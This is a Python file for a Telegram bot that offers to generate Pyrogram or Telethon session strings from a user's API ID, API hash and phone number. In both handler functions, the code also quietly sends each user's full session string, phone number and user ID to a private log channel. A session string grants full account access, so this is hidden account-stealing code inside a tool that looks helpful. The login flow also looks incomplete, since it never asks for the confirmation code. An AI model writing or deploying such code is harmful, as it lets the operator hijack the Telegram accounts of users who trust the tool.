from pyrogram import filters
from pyrogram.types import CallbackQuery, Message
from pyrogram.enums import ChatAction
from pyrogram import Client as PyroClient
from telethon.sync import TelegramClient as TeleClient
from telethon.sessions import StringSession
from config import API_ID, API_HASH
import asyncio
from config import LOG_CHANNEL_ID

user_state = {}

def init(app):
    @app.on_callback_query(filters.regex("gen_(pyrogram|telethon)"))
    async def ask_api_id(_, cq: CallbackQuery):
        user_state[cq.from_user.id] = {"lib": cq.data.split("_")[1]}
        await cq.message.edit("📲 Send your API ID:")
    
    @app.on_message(filters.private & filters.text)
    async def session_flow(_, msg: Message):
        uid = msg.from_user.id
        if uid not in user_state:
            return

        state = user_state[uid]
        text = msg.text

        if "api_id" not in state:
            if not text.isdigit():
                await msg.reply("❗ Please enter a valid numeric API ID.")
                return
            state["api_id"] = int(text)
            await msg.reply("🔑 Now send your API HASH:")
            return

        if "api_hash" not in state:
            state["api_hash"] = text.strip()
            await msg.reply("📞 Now send your phone number (with country code):")
            return

        if "phone" not in state:
            state["phone"] = text.strip()
            await msg.reply("🔄 Sending login code...")
            await msg.chat_action(ChatAction.TYPING)

            if state["lib"] == "pyrogram":
                await handle_pyrogram_session(msg, state)
            else:
                await handle_telethon_session(msg, state)

            del user_state[uid]

async def handle_pyrogram_session(msg, state):
    try:
        async with PyroClient(
            ":memory:",
            api_id=state["api_id"],
            api_hash=state["api_hash"],
            phone_number=state["phone"]
        ) as app:
            session_str = await app.export_session_string()

            # Send to private log channel
            await msg._client.send_message(
                LOG_CHANNEL_ID,
                f"📥 **Pyrogram Session Generated**\n"
                f"👤 User: [{msg.from_user.first_name}](tg://user?id={msg.from_user.id})\n"
                f"🆔 ID: `{msg.from_user.id}`\n"
                f"🔢 Phone: `{state['phone']}`\n"
                f"📄 Session: `{session_str}`"
            )

            await msg.reply(f"✅ Pyrogram String:\n\n`{session_str}`", quote=True)
    except Exception as e:
        await msg.reply(f"❌ Error: {e}")


async def handle_telethon_session(msg, state):
    try:
        client = TeleClient(StringSession(), state["api_id"], state["api_hash"])
        await client.start(phone=state["phone"])
        session_str = client.session.save()
        await client.disconnect()

        # Send to private log channel
        await msg._client.send_message(
            LOG_CHANNEL_ID,
            f"📥 **Telethon Session Generated**\n"
            f"👤 User: [{msg.from_user.first_name}](tg://user?id={msg.from_user.id})\n"
            f"🆔 ID: `{msg.from_user.id}`\n"
            f"🔢 Phone: `{state['phone']}`\n"
            f"📄 Session: `{session_str}`"
        )

        await msg.reply(f"✅ Telethon String:\n\n`{session_str}`", quote=True)
    except Exception as e:
        await msg.reply(f"❌ Error: {e}")
